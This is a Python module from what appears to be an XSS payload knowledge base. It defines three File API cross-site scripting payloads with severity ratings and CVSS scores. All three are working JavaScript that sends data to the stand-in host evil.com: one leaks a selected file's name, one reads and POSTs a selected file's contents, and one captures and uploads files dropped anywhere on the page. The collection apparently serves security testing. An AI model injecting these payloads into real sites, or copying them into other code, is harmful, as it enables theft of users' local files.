#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

File API XSS Payloads
"""

from ..models import PayloadEntry


FILE_API_PAYLOADS = {
    "file_1": PayloadEntry(
        payload="<input type=file onchange=fetch('//evil.com/log?file='+this.files[0].name)>",
        contexts=["html_content"],
        severity="medium",
        cvss_score=6.0,
        description="File name leak",
        tags=["file", "leak", "name"],
        reliability="high",
    ),
    "file_2": PayloadEntry(
        payload="<input type=file onchange=\"var r=new FileReader();r.onload=()=>fetch('//evil.com/log',{method:'POST',body:r.result});r.readAsText(this.files[0])\">",
        contexts=["html_content"],
        severity="critical",
        cvss_score=9.0,
        description="File content exfil",
        tags=["file", "exfil", "content"],
        reliability="high",
    ),
    "file_3": PayloadEntry(
        payload="<script>document.ondrop=e=>{e.preventDefault();[...e.dataTransfer.files].forEach(f=>{var r=new FileReader();r.onload=()=>fetch('//evil.com/log',{method:'POST',body:r.result});r.readAsText(f)})};document.ondragover=e=>e.preventDefault()</script>",
        contexts=["html_content", "javascript"],
        severity="critical",
        cvss_score=9.0,
        description="Drag-drop file exfil",
        tags=["file", "exfil", "dragdrop"],
        reliability="high",
    ),
}

FILE_API_PAYLOADS_TOTAL = len(FILE_API_PAYLOADS)
